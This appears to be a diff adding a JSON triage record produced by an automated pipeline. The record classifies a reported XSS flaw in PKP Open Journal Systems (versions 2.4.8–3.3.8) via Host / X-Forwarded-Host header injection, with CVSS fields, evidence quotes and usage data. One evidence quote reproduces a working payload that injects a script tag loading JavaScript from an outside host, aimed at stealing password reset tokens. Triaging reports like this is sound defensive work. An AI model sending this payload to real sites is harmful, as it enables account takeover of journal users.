@@ -1,0 +1,73 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "The report describes a cross-site scripting (XSS) vulnerability in PKP Open Journal Systems (OJS) versions 2.4.8 through 3.3.8, exploitable via Host header/X-Forwarded-Host injection leading to script execution and potential theft of password reset tokens.",
+    "affected_product": "PKP Open Journal Systems (OJS) versions 2.4.8 - 3.3.8",
+    "cwe": "CWE-79",
+    "cwe_quote": "XSS via Host Header injection and Steal Password Reset Token of another user",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "XSS via Host Header injection and Steal Password Reset Token of another user"
+      },
+      "AC": {
+        "value": "L",
+        "quote": ""
+      },
+      "PR": {
+        "value": "N",
+        "quote": ""
+      },
+      "UI": {
+        "value": "R",
+        "quote": "Paste this request in browser , and you'll see xss pop-up."
+      },
+      "S": {
+        "value": "U",
+        "quote": ""
+      },
+      "C": {
+        "value": "L",
+        "quote": "and steal password reset token vulnerability"
+      },
+      "I": {
+        "value": "L",
+        "quote": "and steal password reset token vulnerability"
+      },
+      "A": {
+        "value": "N",
+        "quote": ""
+      }
+    },
+    "recommended_next_step": "Validate the reported Host / X-Forwarded-Host handling by reproducing the injection against an affected instance, confirm JavaScript execution context and whether password reset tokens can be exfiltrated, and apply input validation/encoding or update to a fixed OJS version.",
+    "confidence": "medium",
+    "evidence_quotes": [
+      {
+        "claim": "Vulnerability type and vector",
+        "quote": "XSS via Host Header injection and Steal Password Reset Token of another user"
+      },
+      {
+        "claim": "Affected versions",
+        "quote": "Version: PKP Open Journals System 2.4.8 >= 3.3"
+      },
+      {
+        "claim": "Reproduction step shows attacker causes browser to load the payload",
+        "quote": "Paste this request in browser , and you'll see xss pop-up."
+      },
+      {
+        "claim": "Exploit payload insertion point",
+        "quote": "Add this after Host Header X-Forwarded-Host: foo\"><script src=//dtf.pw/2.js></script><x=\".com"
+      },
+      {
+        "claim": "Report states mitigation",
+        "quote": "Mitigation: Update to newer version."
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 1920,
+    "output_tokens": 637,
+    "latency_s": null,
+    "batch": true
+  }
+}
